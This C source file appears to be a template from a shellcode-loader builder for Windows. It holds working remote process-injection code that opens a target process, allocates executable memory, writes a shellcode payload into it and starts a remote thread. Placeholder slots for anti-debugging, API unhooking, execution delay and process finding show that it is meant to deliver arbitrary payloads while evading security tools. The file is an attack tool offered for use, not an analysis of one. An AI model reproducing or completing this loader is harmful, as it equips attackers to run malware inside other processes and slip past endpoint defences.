#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
//####USING####

//####DEFINE####

//####CODE####

int Inject(int pid)
{
	const unsigned char raw[] = ####SHELLCODE####;
	int length = sizeof(raw);

	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
	memcpy(encoded, raw, length);

	//####CALL####

	unsigned char* decoded = encoded;

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, decoded, length, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
}

int main(int argc, char** argv) {

    //####DELAY####

   	//####ANTIDEBUG####

	//####UNHOOK####

	//####ARGS####

	int pid = 0;
	if (argc < 2) {
		printf("[-] Missing PID... Finding...\n");
		//####FIND_PROCESS####
	}else{
    	pid = atoi(argv[1]);
	}

    if (pid == 0){
        printf("[-] Process not found\n");
        exit(1);
    }

	Inject(pid);

}